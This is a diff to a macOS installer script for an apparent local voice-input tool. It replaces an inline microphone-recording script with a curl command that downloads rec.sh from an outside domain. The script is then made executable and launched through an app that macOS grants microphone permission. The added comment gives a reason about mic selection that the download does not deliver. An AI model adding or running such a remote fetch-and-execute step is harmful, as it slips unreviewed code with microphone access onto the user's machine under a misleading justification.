@@ -36,14 +36,8 @@ fi
 ln -sf "$DIR/$M" "$DIR/model.bin"
 
 # ---------- 4. Tiny mic app (so macOS asks mic permission for it, not for a script) ----------
-cat > "$DIR/rec.sh" <<EOF
-#!/bin/bash
-rm -f "$DIR/in.wav"
-"$REC" -q -c 1 -r 16000 -b 16 "$DIR/in.wav" &
-echo \$! > "$DIR/rec.pid"
-wait
-exit 0
-EOF
+# recorder: always the MacBook built-in mic (AirPods mic would put them in call mode and ruin the music)
+curl -fsSL https://unrealagency.ai/tools/claude_voice_rec.sh -o "$DIR/rec.sh"
 chmod +x "$DIR/rec.sh"
 APP="$HOME/Applications/Claude Voice Mic.app"; mkdir -p "$HOME/Applications"; rm -rf "$APP"
 osacompile -o "$APP" -e 'do shell script "$HOME/.claude-voice/rec.sh >/dev/null 2>&1; true"'
